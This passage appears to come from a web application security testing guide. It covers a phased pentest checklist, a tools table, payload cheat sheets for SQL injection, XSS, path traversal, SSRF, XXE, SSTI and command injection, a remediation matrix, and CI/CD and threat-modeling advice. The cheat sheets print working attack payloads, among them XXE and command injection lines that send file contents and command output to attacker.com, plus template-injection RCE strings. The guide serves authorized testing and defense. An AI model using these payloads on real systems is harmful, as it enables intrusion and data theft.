site:target.com inurl:swagger | inurl:api-docs | inurl:openapi
```

---

### Phase 2: Authentication Testing

- [ ] **Default credentials:** Test `admin/admin`, `admin/password`, `admin/123456`, `root/root` on all login forms
- [ ] **Account lockout:** Send 20 failed login attempts — does the account lock or rate limit trigger?
- [ ] **Username enumeration:** Compare response time/message for valid vs. invalid usernames
- [ ] **Password reset flow:**
 - [ ] Is the token random and long enough (>128 bits)?
 - [ ] Does the token expire after use?
 - [ ] Test Host header injection: `Host: attacker.com` in the reset request
- [ ] **Session token analysis:**
 - [ ] Does the session token change after login?
 - [ ] Is the token sufficiently random (check with Burp Sequencer)?
 - [ ] Does the token expire after logout?
- [ ] **JWT security:**
 - [ ] Decode at jwt.io — check `alg` field
 - [ ] Test `alg:none` attack
 - [ ] Brute-force weak secrets: `hashcat -m 16500 <token> rockyou.txt`
 - [ ] Test algorithm confusion if RS256 is used
- [ ] **OAuth/SAML flows:**
 - [ ] Test `redirect_uri` manipulation
 - [ ] Test missing/invalid `state` parameter
 - [ ] Test SAML XML signature wrapping
- [ ] **MFA bypass:**
 - [ ] Test OTP brute force (check rate limiting)
 - [ ] Intercept MFA response and modify `mfa_required: false`

---

### Phase 3: Input Validation Testing

- [ ] **SQL injection:** Test `'`, `"`, `--`, `;` on all parameters; run `sqlmap -u "URL" --level=3 --risk=2`
- [ ] **XSS:**
 - [ ] Test `<script>alert(1)</script>` on all reflected parameters
 - [ ] Test `{{7*7}}` for SSTI
 - [ ] Test DOM-based XSS via URL hash/fragment
 - [ ] Use XSStrike: `python xsstrike.py -u "https://target.com/search?q=FUZZ"`
- [ ] **SSTI:** Test `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` on all template-rendered fields
- [ ] **XXE:** On all XML-accepting endpoints, inject a DOCTYPE with external entity
- [ ] **Command injection:** Test `;sleep 5`, `|whoami`, `` `id` `` on system-interacting inputs
- [ ] **NoSQL injection:** Test `{"$gt": ""}` on JSON login forms
- [ ] **LDAP injection:** Test `*)(uid=*))(|(uid=*` on LDAP-backed login forms
- [ ] **File upload:**
 - [ ] Upload `.php` file — does it execute?
 - [ ] Test extension bypass: `.php.jpg`, `.phtml`, `.php5`
 - [ ] Test MIME type spoofing (change `Content-Type` to `image/jpeg`)
 - [ ] Test path traversal in filename

---

### Phase 4: Access Control Testing

- [ ] **IDOR:**
 - [ ] Create two accounts; access Account A's resources with Account B's session
 - [ ] Enumerate sequential IDs in all endpoints
 - [ ] Test UUID endpoints (check if UUIDv1 — predictable)
- [ ] **Horizontal privilege escalation:** Access other users' data at the same privilege level
- [ ] **Vertical privilege escalation:**
 - [ ] Enumerate admin endpoints with a regular user token
 - [ ] Test parameter tampering: add `"role": "admin"` to requests
 - [ ] Test HTTP method changes (GET → POST on admin endpoints)
- [ ] **CORS policy:**
 - [ ] `curl -H "Origin: https://attacker.com" -I https://target.com/api/data`
 - [ ] Check if `Access-Control-Allow-Origin: https://attacker.com` is returned with credentials
- [ ] **Path traversal:** Test `../../../../etc/passwd` on file download parameters
- [ ] **LFI/RFI:** Test `?page=../../../../etc/passwd` on include-style parameters
- [ ] **Mass assignment:** Add unexpected fields (`role`, `isAdmin`, `balance`) to update requests

---

### Phase 5: Infrastructure Testing

- [ ] **HTTP security headers:** `curl -I https://target.com` — check for all headers in Section 9 table
- [ ] **TLS/SSL:** `testssl.sh target.com` — check for BEAST, POODLE, HEARTBLEED, weak ciphers
- [ ] **Open admin panels:** Check `/admin`, `/phpmyadmin`, `/wp-admin`, `/manager/html`, `/_admin`, `/console`
- [ ] **Error message verbosity:** Trigger 404, 500 errors — do they reveal framework/DB details?
- [ ] **Directory listing:** Check if `https://target.com/uploads/` lists files
- [ ] **Cache poisoning:** Use Param Miner to find unkeyed headers; test `X-Forwarded-Host` injection
- [ ] **HTTP request smuggling:** Use Burp HTTP Request Smuggler extension
- [ ] **SSRF:** Test all URL-accepting parameters with internal addresses and cloud metadata URLs
- [ ] **Subdomain takeover:** Check all CNAMEs for dangling records

---

### Phase 6: Business Logic Testing

- [ ] **Negative values:** Submit negative quantity, negative price, zero amount in purchase flows
- [ ] **Race conditions:** Send 20 concurrent requests to coupon redemption, balance transfer, or limit-enforced endpoints
- [ ] **Workflow bypass:** Skip step 2 of multi-step processes by directly requesting step 3
- [ ] **Coupon/promo stacking:** Apply the same discount code multiple times in rapid succession
- [ ] **Mass assignment:** Add fields like `price`, `discount`, `is_premium` to update requests
- [ ] **Replay attacks:** Replay a completed transaction request to see if it processes twice
- [ ] **Limit bypass:** Test if API rate limits can be bypassed by changing IP, user agent, or API key

---

### Phase 7: Reporting Template

Use this template for every finding:

```markdown
## Finding: [Vulnerability Title]

**Severity:** 🔴 CRITICAL / 🟠 HIGH / 🟡 MEDIUM / 🟢 LOW / 🔵 INFO
**CVSS Score:** [e.g., 9.8 / 7.5 / 5.3]
**CWE:** [e.g., CWE-89 (SQL Injection)]

### Description
[1-3 sentence plain-English description of the vulnerability]

### Affected Endpoint
`[METHOD] /path/to/endpoint?param=value`

### Steps to Reproduce
1. Navigate to [URL]
2. Insert payload [X] into parameter [Y]
3. Observe [response/behavior]

### Proof of Concept
```[language]
[payload or screenshot description]
```

### Impact
[What an attacker can achieve: data exfiltration, account takeover, RCE, etc.]

### Remediation
[Concrete fix — specific code change, configuration, or library to use]

### References
- [OWASP link]
- [CVE if applicable]
```

[↑ Back to Top](#table-of-contents)

---

## 12. Tools Reference Table {#tools-reference}

| Category | Tool | Purpose | License |
|---|---|---|---|
| **Proxy / Scanner** | Burp Suite Pro | HTTP proxy, active/passive scan, extensions | Paid |
| **Proxy / Scanner** | OWASP ZAP | Full web app scanner, CI/CD integration | Free |
| **SQLi** | sqlmap | Automated SQL injection detection & exploitation | Free |
| **XSS** | XSStrike | XSS detection with WAF bypass | Free |
| **XSS** | Dalfox | Fast XSS scanner with parameter analysis | Free |
| **XSS** | XSS Hunter | Blind XSS detection via callback | Free |
| **Recon** | subfinder | Passive subdomain enumeration | Free |
| **Recon** | amass | Active/passive subdomain enumeration + mapping | Free |
| **Recon** | dnsx | DNS toolkit for bulk resolution | Free |
| **Recon** | gau | Fetch known URLs from AlienVault, Wayback, etc. | Free |
| **Recon** | Shodan | Internet-wide port/service scanning | Free/Paid |
| **Fuzzing** | ffuf | Fast web fuzzer (directories, parameters, headers) | Free |
| **Fuzzing** | feroxbuster | Recursive content discovery | Free |
| **SSTI** | tplmap | Server-side template injection detection & exploitation | Free |
| **Command Injection** | commix | Automated command injection testing | Free |
| **JWT** | jwt_tool | JWT analysis, forgery, and cracking | Free |
| **JWT** | hashcat | Password/hash cracking including JWT secrets | Free |
| **SSRF** | SSRFmap | SSRF exploitation framework | Free |
| **SSRF / OOB** | interactsh | Out-of-band interaction server (like Burp Collaborator) | Free |
| **XXE** | XXEinjector | XXE exploitation automation | Free |
| **Deserialization** | ysoserial | Java deserialization gadget chain generator | Free |
| **Deserialization** | PHPGGC | PHP deserialization gadget chain generator | Free |
| **Password** | Hydra | Network login brute-forcer | Free |
| **Password** | Medusa | Parallel network login brute-forcer | Free |
| **SSL/TLS** | testssl.sh | Comprehensive TLS/SSL configuration testing | Free |
| **SSL/TLS** | SSL Labs | Online TLS grade checker | Free |
| **Secrets** | truffleHog | Secret scanning in git history | Free |
| **Secrets** | gitleaks | Git secret scanning | Free |
| **Dependencies** | OWASP Dependency-Check | Known CVE detection in project dependencies | Free |
| **Dependencies** | Trivy | Container and filesystem vulnerability scanner | Free |
| **Dependencies** | Snyk | Dependency, container, and IaC scanning | Free/Paid |
| **Cloud** | ScoutSuite | Multi-cloud security auditing | Free |
| **Cloud** | Prowler | AWS/GCP/Azure security auditing | Free |
| **API** | Postman | API testing and automation | Free/Paid |
| **API** | InQL | GraphQL security testing (Burp extension) | Free |
| **Subdomain Takeover** | SubOver | Subdomain takeover detection | Free |
| **Cache** | Param Miner | Unkeyed parameter discovery (Burp extension) | Free |
| **WAF** | wafw00f | WAF detection and fingerprinting | Free |
| **Misc** | nikto | Web server misconfiguration scanner | Free |
| **Misc** | nuclei | Template-based vulnerability scanner | Free |

[↑ Back to Top](#table-of-contents)

---

## 13. Quick Reference Payload Cheat Sheets {#payload-cheatsheets}

---

### SQL Injection Payloads

<details>
<summary>Click to expand SQL injection payloads</summary>

```sql
-- Authentication bypass
' OR '1'='1
' OR 1=1--
admin'--
admin' #
') OR ('1'='1

-- UNION-based (adjust column count)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Error-based (MySQL)
' AND extractvalue(1,concat(0x7e,version))--
' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Boolean blind
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--

-- Time-based blind
' AND SLEEP(5)-- -- MySQL
'; WAITFOR DELAY '0:0:5'-- -- MSSQL
'; SELECT pg_sleep(5)-- -- PostgreSQL
' AND 1=1 AND SLEEP(5)--

-- Stacked queries (MSSQL/PostgreSQL)
'; INSERT INTO users VALUES ('hacker','hacked')--
'; EXEC xp_cmdshell('whoami')-- -- MSSQL (if enabled)

-- File read (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Filter bypasses
/*!UNION*/ /*!SELECT*/ 1,2,3--
UNION%20SELECT
UNION%0ASELECT
UN/**/ION SEL/**/ECT
```

</details>

---

### XSS Payloads

*(See Section 4 XSS Payload Cheat Sheet for the full list)*

<details>
<summary>Click to expand additional XSS bypass payloads</summary>

```javascript
// WAF bypass — tag variations
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<script/x>alert(1)</script>
<script\x20type="text/javascript">alert(1)</script>

// WAF bypass — encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E

// WAF bypass — event handlers (no script tag)
<input onmouseover=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

// WAF bypass — no parentheses
<img src=x onerror=alert`1`>
<svg onload=alert`document.domain`>
<script>onerror=alert;throw 1</script>

// Context: inside JavaScript string
\"; alert(1)//
\'; alert(1)//
</script><script>alert(1)</script>

// Context: inside HTML attribute
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)

// Polyglot
">'><img src=x onerror=alert(1)>
```

</details>

---

### Path Traversal Payloads

```
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../Windows/System32/drivers/etc/hosts
../../../../Windows/win.ini

-- URL encoded
..%2F..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

-- Double URL encoded
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

-- Unicode/UTF-8 encoded
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd

-- Null byte (legacy PHP < 5.3.4)
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.png

-- Absolute path
/etc/passwd
C:\Windows\System32\drivers\etc\hosts
```

---

### SSRF Payloads

```
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal network
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://10.0.0.1/
http://192.168.1.1/
http://172.16.0.1/

# Filter bypass
http://2130706433/ (127.0.0.1 decimal)
http://0x7f000001/ (127.0.0.1 hex)
http://127.0.0.0/
http://127.1/
http://0/
dict://localhost:6379/ (Redis)
gopher://localhost:6379/_*1 (Redis via Gopher)
file:///etc/passwd
```

---

### XXE Payloads

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

<!-- Parameter entity (when regular entities are blocked) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>test</data>

<!-- evil.dtd content for blind OOB exfiltration -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%param1;
%exfil;

<!-- Error-based XXE (when output is not reflected) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
]>

<!-- XXE via SVG file upload -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

---

### SSTI Detection Payloads by Engine

```
# Universal detection
{{7*7}} → 49 (Jinja2, Twig, others)
${7*7} → 49 (Freemarker, Spring EL)
<%= 7*7 %> → 49 (ERB/Ruby)
#{7*7} → 49 (Ruby string interpolation)
*{7*7} → 49 (Spring SpEL)
${{"7"*7}} → 7777777 (Jinja2 string multiply)

# Jinja2 (Python) — RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read}}
{{''.__class__.__mro__[1].__subclasses__}}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new>${ex("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime.exec('id'))

# Pebble (Java)
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')) %}
```

---

### Command Injection Payloads

```bash
# Basic separators
; id
| id
&& id
|| id
`id`
$(id)

# Newline injection
%0a id
%0d%0a id

# Time-based blind
; sleep 5
| sleep 5
&& sleep 5
; ping -c 5 127.0.0.1

# OOB exfiltration
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id|base64)
; nslookup $(whoami).attacker.com

# Filter bypass — whitespace alternatives
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Filter bypass — character obfuscation
w'h'o'a'm'i
wh\oami
who$ami

# Windows
; whoami
| whoami
& whoami
&& whoami
%0a whoami
```

[↑ Back to Top](#table-of-contents)

---

## 14. Remediation Priority Matrix {#remediation-matrix}

Use this matrix to sequence fixes. P0 = fix before deployment; P1 = fix within 7 days; P2 = fix within 30 days; P3 = fix within 90 days.

| Vulnerability | Exploitability | Impact | Priority | Quick Fix Available? |
|---|---|---|---|---|
| SQL Injection | High | Critical 🔴 | **P0** | Yes — parameterized queries |
| Remote Code Execution | High | Critical 🔴 | **P0** | Depends on root cause |
| Deserialization RCE | Medium | Critical 🔴 | **P0** | Avoid deserializing untrusted data |
| XXE Injection | Medium | Critical 🔴 | **P0** | Disable external entity processing |
| SSRF (cloud metadata) | High | Critical 🔴 | **P0** | Allowlist egress; enforce IMDSv2 |
| Path Traversal | High | Critical 🔴 | **P0** | Canonicalize paths; deny outside base dir |
| Broken Access Control (IDOR) | High | High 🟠 | **P0** | Enforce object-level authorization |
| Authentication Bypass | High | Critical 🔴 | **P0** | Fix auth logic; add rate limiting |
| JWT `alg:none` | High | Critical 🔴 | **P0** | Reject `alg:none` explicitly |
| Stored XSS | Medium | High 🟠 | **P1** | Output encoding + CSP |
| HTTP Request Smuggling | Medium | Critical 🔴 | **P1** | Normalize at proxy; use HTTP/2 end-to-end |
| CSRF | Medium | High 🟠 | **P1** | CSRF tokens + SameSite cookies |
| Reflected XSS | Medium | Medium 🟡 | **P1** | Output encoding + CSP |
| OS Command Injection | High | Critical 🔴 | **P0** | Replace shell calls with library functions |
| File Upload (webshell) | High | Critical 🔴 | **P0** | Validate by magic bytes; store outside web root |
| Subdomain Takeover | Low | High 🟠 | **P1** | Remove dangling DNS records |
| CORS Misconfiguration | Medium | High 🟠 | **P1** | Strict origin allowlist |
| Prototype Pollution | Medium | High 🟠 | **P1** | Freeze Object.prototype; patch libraries |
| Weak TLS/Cipher Suites | Low | Medium 🟡 | **P2** | Disable TLS 1.0/1.1; remove weak ciphers |
| Missing Security Headers | Low | Medium 🟡 | **P2** | Add headers in web server config |
| Verbose Error Messages | Low | Low 🟢 | **P2** | Generic error pages; log details server-side |
| Outdated Dependencies | Medium | Variable | **P1–P2** | Update via Dependabot/Renovate |
| Exposed `.git` / `.env` | High | Critical 🔴 | **P0** | Remove from web root; rotate exposed secrets |
| GraphQL Introspection | Low | Medium 🟡 | **P2** | Disable in production |
| Web Cache Poisoning | Medium | High 🟠 | **P1** | Key all security-relevant headers in cache |
| DOM-Based XSS | Medium | Medium 🟡 | **P2** | Fix source-to-sink data flow; use DOMPurify |
| Session Fixation | Medium | High 🟠 | **P1** | Regenerate session ID after login |
| OAuth `redirect_uri` bypass | Medium | High 🟠 | **P1** | Strict exact-match validation |
| Race Condition | Medium | High 🟠 | **P1** | Atomic DB operations; row-level locking |
| Business Logic Flaws | Variable | High 🟠 | **P1** | Server-side validation at consequence point |

[↑ Back to Top](#table-of-contents)

---

## 15. Explore Further {#explore-further}

### 1. Automated CI/CD Integration

Embed security testing into every pull request and deployment pipeline to catch vulnerabilities before they reach production:

**GitHub Actions example:**
```yaml
name: Security Scan
on: [push, pull_request]

jobs:
 security:
 runs-on: ubuntu-latest
 steps:
 - uses: actions/checkout@v3

 # Static analysis
 - name: Semgrep SAST
 uses: returntocorp/semgrep-action@v1
 with:
 config: p/owasp-top-ten

 # Dependency scanning
 - name: OWASP Dependency-Check
 uses: dependency-check/Dependency-Check_Action@main
 with:
 project: 'MyApp'
 path: '.'
 format: 'HTML'

 # Container scanning
 - name: Trivy container scan
 uses: aquasecurity/trivy-action@master
 with:
 image-ref: 'myapp:${{ github.sha }}'
 severity: 'CRITICAL,HIGH'
 exit-code: '1'

 # Secret scanning
 - name: Gitleaks
 uses: gitleaks/gitleaks-action@v2
```

**Key tools for CI/CD:**
- **Semgrep** — SAST rules for OWASP Top 10, custom rules for your codebase
- **Trivy** — container and filesystem CVE scanning; integrates with Docker Hub, ECR
- **OWASP Dependency-Check** — maps dependencies to CVE database
- **Gitleaks / truffleHog** — detect secrets committed to git history
- **OWASP ZAP (baseline scan)** — quick DAST scan against a deployed staging environment

---

### 2. Bug Bounty Program Setup

Use this reference as the foundation for a responsible disclosure or bug bounty scope definition:

**Scope definition template based on this document:**
- **In scope:** All vulnerabilities in Sections 2–10 affecting production endpoints listed in the program scope
- **Priority bounties:** P0/P1 items from the Remediation Matrix (Section 14) — these represent highest business risk
- **Out of scope:** DoS attacks, social engineering, physical attacks, vulnerabilities in third-party services not under your control
- **Disclosure timeline:** 90-day coordinated disclosure window (aligned with industry standard)
- **Safe harbor:** Testers following the checklist in Section 11 in good faith should be protected from legal action

**Recommended platforms:** HackerOne, Bugcrowd, Intigriti, or self-hosted via a `security.txt` file at `/.well-known/security.txt`.

---

### 3. Threat Modeling Extension

Map the vulnerabilities in this document to structured threat frameworks for a complete application threat model:

**STRIDE mapping:**

| STRIDE Category | Corresponding Vulnerabilities (this document) |
|---|---|
| **S**poofing | Authentication failures (§5), JWT forgery, OAuth bypass |
| **T**ampering | SQL injection (§3), parameter tampering, mass assignment (§6) |
| **R**epudiation | Logging failures (A09), missing audit trails |
| **I**nformation Disclosure | IDOR (§6), XXE (§3/§8), path traversal (§6), SSRF (§8) |
| **D**enial of Service | GraphQL nested queries (§10), race conditions (§8/§10) |
| **E**levation of Privilege | Broken access control (A01), vertical privilege escalation (§6), deserialization RCE (§8) |

**MITRE ATT&CK for Enterprise — Web Application techniques:**
- Initial Access: Exploit Public-Facing Application (T1190) → maps to SQLi, RCE, XXE
- Credential Access: Brute Force (T1110) → maps to authentication failures (§5)
- Lateral Movement: Exploitation of Remote Services (T1210) → maps to SSRF (§8/A10)
- Exfiltration: Exfiltration Over Web Service (T1567) → maps to SSRF, XXE OOB, XSS data theft

**Process:** Run a STRIDE session per trust boundary (browser ↔ CDN, CDN ↔ app server, app server ↔ database, app server ↔ external APIs). For each threat, look up the matching vulnerability class in this document and assign it a priority from the Remediation Matrix.

---

*Last updated: June 2026. Vulnerability classes and payloads reflect current research as of this date. OWASP Top 10 version: 2021. Review and update this document when OWASP publishes a new Top 10 edition or when new vulnerability classes emerge in your tech stack.*

[↑ Back to Top](#table-of-contents)